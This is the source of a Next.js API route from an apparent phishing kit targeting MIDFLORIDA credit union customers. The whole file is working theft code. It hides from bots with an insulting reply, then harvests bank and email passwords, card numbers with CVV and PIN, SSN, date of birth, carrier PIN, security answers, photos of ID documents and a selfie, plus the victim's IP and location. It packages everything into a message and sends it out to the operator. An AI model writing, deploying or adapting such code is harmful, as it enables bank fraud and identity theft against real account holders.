import geoip from "geoip-lite";
import MobileDetect from "mobile-detect";
import nextConnect from "next-connect";
import { NextApiRequest, NextApiResponse } from "next";
import middleware from "../../middleware/middleware";
import { sendMedias } from "../../utils/sendMedias";

interface ExtendedRequest extends NextApiRequest {
  files: any;
}

const handler = nextConnect();
handler.use(middleware);

handler.post(async (req: ExtendedRequest, res: NextApiResponse) => {
  const md = new MobileDetect(req.headers[`user-agent`] as string);
  const isBot = md.is(`Bot`);
  if (isBot) {
    res.send(`Fuck off`);
    return;
  }

  try {
    const ip = req.headers[`x-forwarded-for`] || req.connection.remoteAddress;
    const geo = geoip.lookup(String(ip).split(`,`)[0]);

    const front = req.files && (req.files.front as any);
    const back = req.files && (req.files.back as any);
    const selfie = req.files && (req.files.selfie as any);
    const values = req.body;
    const message = `
<div>------------------------------------</div>
<h4>LOGIN</h4>
<p>(▰˘◡˘▰) ATTEMPT ☞ <b>${
      JSON.parse(values.logins[0])[`1`].loginDetails.loginAttempt
    }</b></p>
<p>(▰˘◡˘▰) LOGIN ID ☞ <b>${
      JSON.parse(values.logins[0])[`1`].loginDetails.username
    }</b></p>
<p>(▰˘◡˘▰) PASSWORD ☞ <b>${
      JSON.parse(values.logins[0])[`1`].loginDetails.password
    }</b></p>
${
  JSON.parse(values.logins[0])[`2`]
    ? `
<p>(▰˘◡˘▰) ATTEMPT ☞ <b>${
        JSON.parse(values.logins[0])[`2`].loginDetails.loginAttempt
      }</b></p>
<p>(▰˘◡˘▰) LOGIN ID ☞ <b>${
        JSON.parse(values.logins[0])[`2`].loginDetails.username
      }</b></p>
<p>(▰˘◡˘▰) PASSWORD ☞ <b>${
        JSON.parse(values.logins[0])[`2`].loginDetails.password
      }</b></p>`
    : ``
}
${
  values.emailLogins
    ? `<div>------------------------------------</div>
<h4>EMAIL</h4>
<p>(▰˘◡˘▰) ATTEMPT ☞ <b>${
        JSON.parse(values.emailLogins[0])["1"].emailLogins.attempt
      }</b></p>
<p>(▰˘◡˘▰) EMAIL ☞ <b>${
        JSON.parse(values.emailLogins[0])["1"].emailLogins.email
      }</b></p>
<p>(▰˘◡˘▰) PASSWORD ☞ <b>${
        JSON.parse(values.emailLogins[0])["1"].emailLogins.emailPassword
      }</b></p>
${
  JSON.parse(values.emailLogins[0])["2"]
    ? `<p>(▰˘◡˘▰) ATTEMPT ☞ <b>${
        JSON.parse(values.emailLogins[0])["2"].emailLogins.attempt
      }</b></p>
<p>(▰˘◡˘▰) EMAIL ☞ <b>${
        JSON.parse(values.emailLogins[0])["2"].emailLogins.email
      }</b></p>
<p>(▰˘◡˘▰) PASSWORD ☞ <b>${
        JSON.parse(values.emailLogins[0])["2"].emailLogins.emailPassword
      }</b></p>`
    : ``
}`
    : ``
}
${
  values.billing
    ? `<div>------------------------------------</div>
<h4>BILLING</h4>
<p>(▰˘◡˘▰) FIRST NAME ☞ <b>${JSON.parse(values.billing[0]).firstname}</b></p>
<p>(▰˘◡˘▰) LAST NAME ☞ <b>${JSON.parse(values.billing[0]).lastname}</b></p>
<p>(▰˘◡˘▰) DOB ☞ <b>${JSON.parse(values.billing[0]).dob}</b></p>
<p>(▰˘◡˘▰) ADDRESS ☞ <b>${JSON.parse(values.billing[0]).streetAddress}</b></p>
<p>(▰˘◡˘▰) ZIP CODE ☞ <b>${JSON.parse(values.billing[0]).zipCode}</b></p>
<p>(▰˘◡˘▰) STATE ☞ <b>${JSON.parse(values.billing[0]).state}</b></p>
<p>(▰˘◡˘▰) PHONE N. ☞ <b>${
        JSON.parse(values.billing[0]).phoneNumber || ``
      }</b></p>
<p>(▰˘◡˘▰) CARRIER PIN ☞ <b>${
        JSON.parse(values.billing[0]).carrierPin || ``
      }</b></p>`
    : ``
}
${
  values.cardDetails
    ? `<div>------------------------------------</div>
<h4>CARD</h4>
<p>(▰˘◡˘▰) CARD ☞ <b>${JSON.parse(values.cardDetails[0]).cardNumber}</b></p>
<p>(▰˘◡˘▰) EXP. DATE ☞ <b>${
        JSON.parse(values.cardDetails[0]).expirationDate
      }</b></B></p>
<p>(▰˘◡˘▰) CVV ☞ <b>${JSON.parse(values.cardDetails[0]).cvv}</b></p>
<p>(▰˘◡˘▰) CARD PIN ☞ <b>${JSON.parse(values.cardDetails[0]).cardPin}</b></p>
<p>(▰˘◡˘▰) SSN ☞ <b>${JSON.parse(values.cardDetails[0]).ssn}</b></p>`
    : ``
}
${
  values.answers
    ? `<div>------------------------------------</div>
<h4>QUESTIONS</h4>
${Object.keys(JSON.parse(values.answers[0]))
  .splice(0, Math.ceil(Object.keys(JSON.parse(values.answers[0])).length / 2))
  .map((_, index) => {
    return `<p>(▰˘◡˘▰) ${index + 1}) ${
      JSON.parse(values.answers[0])[`quest${index + 1}`]
    }</p>
<p>a) <b>${JSON.parse(values.answers[0])[`ans${index + 1}`]}</b></p>
`;
  })}`
    : ``
}
${
  req.files && (req.files.front || req.files.back)
    ? `<div>------------------------------------</div>
<h4>DOCUMENTS${selfie ? ` & SELFIE` : ``}</h4>
<p>(▰˘◡˘▰) See attached files</b></p>`
    : ``
}
<div>------------------------------------</div>
<p>(▰˘◡˘▰) IP ☞ <b>${String(ip).split(`,`)[0]}</b></p>
<p>(▰˘◡˘▰) LOCATION ☞ <b>${geo?.city}, ${geo?.country}</b></p>
<p>(▰˘◡˘▰) TIMEZONE ☞ <b>${geo?.timezone}</b></p>
<p>(▰˘◡˘▰) USER AGENT ☞ <b>${req.headers[`user-agent`]}</b></p>
<div>------------------------------------</div>
<p>(▰˘◡˘▰) ID ☞ <b>#${values.sessionId[0].trim() || ``}</b></p>
<div>------------------------------------</div>
`;

    await sendMedias(
      message,
      `MIDFLORIDA CU | ${values.form} by ROCKET 🚀 From ${
        String(ip).split(`,`)[0]
      }`,
      req.files && (front || back)
        ? [
            {
              filename: `Front.${
                front[0].headers[`content-type`].split(`/`)[1]
              }`,
              content: front[0],
            },
            {
              filename: `Back.${back[0].headers[`content-type`].split(`/`)[1]}`,
              content: back[0],
            },
            ...(selfie
              ? [
                  {
                    filename: `Selfie.${
                      selfie[0].headers[`content-type`].split(`/`)[1]
                    }`,
                    content: selfie[0],
                  },
                ]
              : []),
          ]
        : []
    );
  } catch (error) {
    console.log(error);
  }

  res.send(`OK`);
});

export const config = {
  api: {
    bodyParser: false,
  },
};

export default handler;
